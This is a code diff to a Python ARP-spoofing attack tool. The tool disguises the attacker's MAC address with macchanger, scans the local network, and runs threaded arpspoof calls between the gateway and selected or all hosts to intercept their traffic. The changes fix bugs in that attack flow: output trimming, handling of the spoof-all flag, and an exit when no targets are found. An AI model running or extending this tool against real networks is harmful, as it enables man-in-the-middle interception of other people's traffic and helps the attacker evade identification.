@@ -46,7 +46,7 @@ def change_mac():
     print(color.BLUE+"[~] Changing MAC address..."+color.END)
     subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
     cmd = subprocess.run(['macchanger', '-A' , interface], capture_output=True).stdout.decode()
-    for line in cmd.strip().splitlines():
+    for line in cmd.strip().splitlines()[:3]:
         print(color.GREEN+"[+] "+line.split(':', 1)[0]+": "+color.YELLOW+line.split(':', 1)[1]+color.END)
     subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()
 
@@ -54,7 +54,7 @@ def reset_mac():
     print(color.BLUE+"[~] Restoring MAC address..."+color.END)
     subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
     cmd = subprocess.run(['macchanger', '-p' , interface], capture_output=True).stdout.decode()
-    for line in cmd.strip().splitlines():
+    for line in cmd.strip().splitlines()[:3]:
         print(color.GREEN+"[+] "+line.split(':', 1)[0]+": "+color.YELLOW+line.split(':', 1)[1]+color.END)
     subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()
     
@@ -94,9 +94,10 @@ def get_ssid():
         print(color.RED+"[-] An error has occured during fetching ESSID"+color.END)
 
 def scan_network():
-    global ip_dict
+    global ip_dict, all
     ip_dict = {}
     i = 1
+    all = False
     net_table = PrettyTable()
     net_table.field_names = ["", "IP", "MAC"]
     
@@ -155,19 +156,23 @@ def arpspoof(ip1,ip2,pos):
 def attck_thread():
     global J
     threads = []
-    all = False
     print(color.BLUE+"[~] Starting Attack..."+color.END)
     J = True
     if all:
-        for w in ip_dict:
-            t1 = threading.Thread(target=arpspoof, args=(gateway, ip_dict[w], '+',))
-            t2 = threading.Thread(target=arpspoof, args=(ip_dict[w], gateway, '-',))
-            threads.append(t1)
-            threads.append(t2)
-        for i in threads:
-            i.start()
-        for i in threads:
-            i.join()
+        if len(ip_dict) > 0:
+            for w in ip_dict:
+                t1 = threading.Thread(target=arpspoof, args=(gateway, ip_dict[w], '+',))
+                t2 = threading.Thread(target=arpspoof, args=(ip_dict[w], gateway, '-',))
+                threads.append(t1)
+                threads.append(t2)
+            for i in threads:
+                i.start()
+            for i in threads:
+                i.join()
+        else:
+            print(color.RED+"[-] No devices available to spoof"+color.END)
+            reset_mac()
+            sys.exit(color.RED+"Exiting..."+color.END)
     else:
         for i in choice_ip.split():
             t1 = threading.Thread(target=arpspoof, args=(gateway, ip_dict[int(i)], '+',))
@@ -220,8 +225,8 @@ try:
     get_gateway()
     get_netmask()
     get_ssid()
-    change_mac()
-    time.sleep(3)
+    # change_mac()
+    time.sleep(5)
     scan_network()
     target()
     
